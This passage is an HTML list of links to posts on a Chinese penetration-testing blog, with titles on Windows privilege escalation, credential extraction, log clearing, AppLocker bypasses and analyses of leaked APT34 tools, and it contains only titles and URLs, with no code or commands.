    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows-Event-Viewer-Log-(EVT)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E4%B8%89-%E5%88%A0%E9%99%A4%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9F%E6%8C%87%E5%AE%9A%E6%8C%87%E5%AE%9A%E6%97%B6%E9%97%B4%E6%AE%B5evt%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/">Windows Event Viewer Log (EVT)单条日志清除（三）——删除当前系统指定指定时间段evt日志记录</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7Juicy-Potato%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/">Windows本地提权工具Juicy Potato测试分析</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/">Windows下的密码hash——NTLM hash和Net-NTLM hash介绍</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-Net-NTLMv1%E4%BB%8B%E7%BB%8D/">Windows下的密码hash——Net-NTLMv1介绍</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%9C%AC%E5%9C%B0%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8B%E5%B7%A5%E5%85%B7LaZagne%E4%B8%AD%E7%9A%84%E8%87%AA%E5%AE%9A%E4%B9%89%E8%84%9A%E6%9C%AC%E5%BC%80%E5%8F%91/">本地密码查看工具LaZagne中的自定义脚本开发</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E4%BB%8E%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD.NET%E7%A8%8B%E5%BA%8F%E9%9B%86(Assembly.Load)%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/">从内存加载.NET程序集(Assembly.Load)的利用分析</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E4%BB%8E%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD.NET%E7%A8%8B%E5%BA%8F%E9%9B%86(execute-assembly)%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/">从内存加载.NET程序集(execute-assembly)的利用分析</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%AF%B9APT34%E6%B3%84%E9%9C%B2%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90-HighShell%E5%92%8CHyperShell/">对APT34泄露工具的分析——HighShell和HyperShell</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%AF%B9APT34%E6%B3%84%E9%9C%B2%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90-Jason/">对APT34泄露工具的分析——Jason</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%AF%B9APT34%E6%B3%84%E9%9C%B2%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90-PoisonFrog%E5%92%8CGlimpse/">对APT34泄露工具的分析——PoisonFrog和Glimpse</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%95%85%E9%9A%9C%E8%AF%8A%E6%96%AD%E5%B9%B3%E5%8F%B0%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8%E6%8A%80%E5%B7%A7/">故障诊断平台在渗透测试中的应用技巧</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8rundll32%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%9E%90/">关于利用rundll32执行程序的分析</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E7%BB%93%E6%9D%9F%E8%BF%9B%E7%A8%8B%E5%AF%BC%E8%87%B4BSOD%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/">结束进程导致BSOD的利用分析</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%82%80%E5%84%A1%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8E%E6%A3%80%E6%B5%8B/">傀儡进程的实现与检测</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8AlwaysInstallElevated%E6%8F%90%E6%9D%83%E7%9A%84%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/">利用AlwaysInstallElevated提权的测试分析</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8API-NtQueryInformationThread%E5%92%8CI_QueryTagInformation%E5%AE%9E%E7%8E%B0%E5%AF%B9Windwos%E6%97%A5%E5%BF%97%E7%9B%91%E6%8E%A7%E7%9A%84%E7%BB%95%E8%BF%87/">利用API NtQueryInformationThread和I_QueryTagInformation实现对Windwos日志监控的绕过</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8Assembly-Load-&amp;-LoadFile%E7%BB%95%E8%BF%87Applocker%E7%9A%84%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/">利用Assembly Load &amp; LoadFile绕过Applocker的分析总结</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8BDF%E5%90%91EXE%E6%96%87%E4%BB%B6%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8/">利用BDF向EXE文件植入后门</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8BDF%E5%90%91DLL%E6%96%87%E4%BB%B6%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8/">利用BDF向DLL文件植入后门</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8BHO%E5%AE%9E%E7%8E%B0IE%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81/">利用BHO实现IE浏览器劫持</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8globalAPIhooks%E5%9C%A8Win7%E7%B3%BB%E7%BB%9F%E4%B8%8B%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B/">利用globalAPIhooks在Win7系统下隐藏进程</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8IIS%E7%9A%84%E7%AB%AF%E5%8F%A3%E5%85%B1%E4%BA%AB%E5%8A%9F%E8%83%BD%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99/">利用IIS的端口共享功能绕过防火墙</a></p>
  </li>
  <li>
    <p>利用IIS的模块功能绕过防火墙</p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8JS%E5%8A%A0%E8%BD%BD.Net%E7%A8%8B%E5%BA%8F/">利用JS/Vbs加载.Net程序</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8VSTO%E5%AE%9E%E7%8E%B0%E7%9A%84office%E5%90%8E%E9%97%A8/">利用VSTO实现的office后门</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8wmic%E8%B0%83%E7%94%A8xsl%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/">利用wmic调用xsl文件的分析与利用</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%A8%A1%E6%8B%9F%E5%8F%AF%E4%BF%A1%E7%9B%AE%E5%BD%95%E7%9A%84%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7%E6%89%A9%E5%B1%95/">模拟可信目录的利用技巧扩展</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%88%A9%E7%94%A8NSA-Smbtouch%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8B%E5%86%85%E7%BD%91/">内网安全——利用NSA Smbtouch批量检测内网</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E4%BD%BF%E7%94%A8IDA%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95WanaCrypt0r%E4%B8%AD%E7%9A%84tasksche.exe/">逆向分析——使用IDA动态调试WanaCrypt0r中的tasksche.exe</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E9%85%8D%E7%BD%AEAdditional-LSA-Protection%E7%9B%91%E6%8E%A7Password-Filter-DLL/">配置Additional LSA Protection监控Password Filter DLL</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E4%BD%BF%E7%94%A8LUA%E8%84%9A%E6%9C%AC%E7%BB%95%E8%BF%87Applocker%E7%9A%84%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/">使用LUA脚本绕过Applocker的测试分析</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Compatibility-Shims/">渗透测试中的Application Compatibility Shims</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Verifier(DoubleAgent%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D)/">渗透测试中的Application Verifier(DoubleAgent利用介绍)</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84certutil.exe/">渗透测试中的certutil</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84ClickOnce/">渗透测试中的ClickOnce</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84msiexec/">渗透测试中的msiexec</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Node.js-Downloader%E7%9A%84%E5%AE%9E%E7%8E%B0/">渗透测试中的Node.js——Downloader的实现</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Node.js-%E5%88%A9%E7%94%A8C++%E6%8F%92%E4%BB%B6%E9%9A%90%E8%97%8F%E7%9C%9F%E5%AE%9E%E4%BB%A3%E7%A0%81/">渗透测试中的Node.js——利用C++插件隐藏真实代码</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Volume-Shadow-Copy/">渗透测试中的Volume Shadow Copy</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-Windows%E4%B8%8B%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E7%9A%84%E4%BD%BF%E7%94%A8/">渗透基础——Windows下计划任务的使用</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E4%BB%8EExchange%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%90%9C%E7%B4%A2%E5%92%8C%E5%AF%BC%E5%87%BA%E9%82%AE%E4%BB%B6/">渗透基础——从Exchange服务器上搜索和导出邮件</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86/">渗透基础——端口转发与代理</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E8%8E%B7%E5%BE%97%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9F%E5%B7%B2%E5%AE%89%E8%A3%85%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%88%97%E8%A1%A8/">渗透基础——获得当前系统已安装的程序列表</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E7%9A%84%E8%8E%B7%E5%8F%96/">渗透基础——活动目录信息的获取</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%AE%89%E8%A3%85Microsoft_.NET_Framework/">渗透基础——命令行下安装Microsoft .NET Framework</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E4%BD%BF%E7%94%A8Go%E8%AF%AD%E8%A8%80%E5%BC%80%E5%8F%91socks%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7/">渗透基础——使用Go语言开发socks代理工具</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E9%80%9A%E8%BF%87LDAP%E5%8D%8F%E8%AE%AE%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%9F%9F%E7%94%A8%E6%88%B7%E7%9A%84%E5%8F%A3%E4%BB%A4/">渗透基础——通过LDAP协议暴力破解域用户的口令</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E9%80%89%E6%8B%A9%E4%B8%80%E4%B8%AA%E5%90%88%E9%80%82%E7%9A%84C2%E5%9F%9F%E5%90%8D/">渗透基础——选择一个合适的C2域名</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7%E5%8F%A3%E4%BB%A4%E7%AD%96%E7%95%A5%E7%9A%84%E8%8E%B7%E5%8F%96/">渗透基础——域内用户口令策略的获取</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-PPTP%E5%8F%A3%E4%BB%A4%E7%9A%84%E8%8E%B7%E5%8F%96%E4%B8%8E%E7%88%86%E7%A0%B4/">渗透技巧——PPTP口令的获取与爆破</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows-command-line-process-auditing%E7%9A%84%E7%BB%95%E8%BF%87/">渗透技巧——Windows command line process auditing的绕过</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows-Token%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90%E7%9A%84%E5%88%A9%E7%94%A8/">渗透技巧——Windows Token九种权限的利用</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B8%8BNTFS%E6%96%87%E4%BB%B6%E7%9A%84%E6%97%B6%E9%97%B4%E5%B1%9E%E6%80%A7/">渗透技巧——Windows下NTFS文件的时间属性</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B8%8BNTFS%E6%96%87%E4%BB%B6%E7%9A%84USN-Journal/">渗透技巧——Windows下NTFS文件的USN Journal</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B8%8B%E7%9A%84Access-Control-List/">渗透技巧——Windows下的Access Control List</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B8%8B%E7%9A%84Remote-Registry/">渗透技巧——Windows下的Remote Registry</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B8%ADnet-session%E7%9A%84%E5%88%A9%E7%94%A8/">渗透技巧——Windows中net session的利用</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Junction-Folders%E5%92%8CLibrary-Files%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/">渗透技巧——Junction Folders和Library Files的后门利用</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Pass-the-Hash-with-Remote-Desktop/">渗透技巧——Pass the Hash with Remote Desktop</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-RecentFileCache.bcf%E5%92%8CAmcache.hve%E5%8D%95%E6%9D%A1%E8%AE%B0%E5%BD%95%E7%9A%84%E6%B8%85%E9%99%A4/">渗透技巧——RecentFileCache.bcf和Amcache.hve单条记录的清除</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/">渗透技巧——Token窃取与利用</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E5%B9%B3%E5%8F%B0%E8%BF%90%E8%A1%8CMasscan%E5%92%8CNmap/">渗透技巧——Windows平台运行Masscan和Nmap</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87/">渗透技巧——Windows日志的删除与绕过</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4/">渗透技巧——Windows单条日志的删除</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/">渗透技巧——Windows系统的帐户隐藏</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C%E8%AE%B0%E5%BD%95%E7%9A%84%E8%8E%B7%E5%8F%96%E4%B8%8E%E6%B8%85%E9%99%A4/">渗透技巧——Windows系统文件执行记录的获取与清除</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%9A%84%E5%A4%9A%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/">渗透技巧——Windows系统远程桌面的多用户登录</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E5%89%AA%E8%B4%B4%E6%9D%BF%E7%9A%84%E5%88%A9%E7%94%A8/">渗透技巧——Windows下剪贴板的利用</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E8%BF%9C%E7%A8%8B%E5%8D%8F%E5%8A%A9%E7%9A%84%E9%9A%90%E8%94%BD%E6%89%A7%E8%A1%8C/">渗透技巧——Windows远程协助的隐蔽执行</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E5%B8%90%E6%88%B7%E7%9A%84RID-Hijacking/">渗透技巧——Windows帐户的RID Hijacking</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B8%ADCredential-Manager%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96/">渗透技巧——Windows中Credential Manager的信息获取</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A8%8B%E5%BA%8F%E7%9A%84%E9%99%8D%E6%9D%83%E5%90%AF%E5%8A%A8/">渗透技巧——程序的降权启动</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8EAdmin%E6%9D%83%E9%99%90%E5%88%87%E6%8D%A2%E5%88%B0System%E6%9D%83%E9%99%90/">渗透技巧——从Admin权限切换到System权限</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8Egithub%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%96%B9%E6%B3%95/">渗透技巧——从github下载文件的多种方法</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8E%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%8F%90%E5%8F%96%E6%98%8E%E6%96%87%E5%87%AD%E6%8D%AE/">渗透技巧——从远程桌面客户端提取明文凭据</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">渗透技巧——导出Chrome浏览器中保存的密码</a></p>
  </li>
  <li>
    <p>渗透技巧——导出Firefox浏览器中保存的密码</p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%BE%97Powershell%E5%91%BD%E4%BB%A4%E7%9A%84%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/">渗透技巧——获得Powershell命令的历史记录</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%BE%97Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/">渗透技巧——获得Windows系统的远程桌面连接历史记录</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%8F%96Windows%E7%B3%BB%E7%BB%9F%E4%B8%8BDPAPI%E4%B8%AD%E7%9A%84MasterKey/">渗透技巧——获取Windows系统下DPAPI中的MasterKey</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">渗透技巧——离线导出Chrome浏览器中保存的密码</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8Masterkey%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">渗透技巧——利用Masterkey离线导出Chrome浏览器中保存的密码</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8PDF%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96Net-NTLM-hash/">渗透技巧——利用PDF文件获取Net-NTLM hash</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8PHP%E8%84%9A%E6%9C%AC%E4%BB%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E8%8E%B7%E5%BE%97Net-NTLM-hash/">渗透技巧——利用PHP脚本从浏览器中获得Net-NTLM hash</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8%E8%99%9A%E6%8B%9F%E7%A3%81%E7%9B%98%E5%AE%9E%E7%8E%B0%E7%9A%84-%E6%97%A0%E6%96%87%E4%BB%B6/">渗透技巧——利用虚拟磁盘实现的“无文件”</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E7%9A%84%E5%8F%82%E6%95%B0%E9%9A%90%E8%97%8F%E6%8A%80%E5%B7%A7/">渗透技巧——快捷方式文件的参数隐藏技巧</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8netsh%E6%8A%93%E5%8F%96%E8%BF%9E%E6%8E%A5%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTLMv2-Hash/">渗透技巧——利用netsh抓取连接文件服务器的NTLMv2 Hash</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8%E5%9B%BE%E6%A0%87%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96%E8%BF%9E%E6%8E%A5%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTLMv2-Hash/">渗透技巧——利用图标文件获取连接文件服务器的NTLMv2 Hash</a></p>
  </li>
  <li>
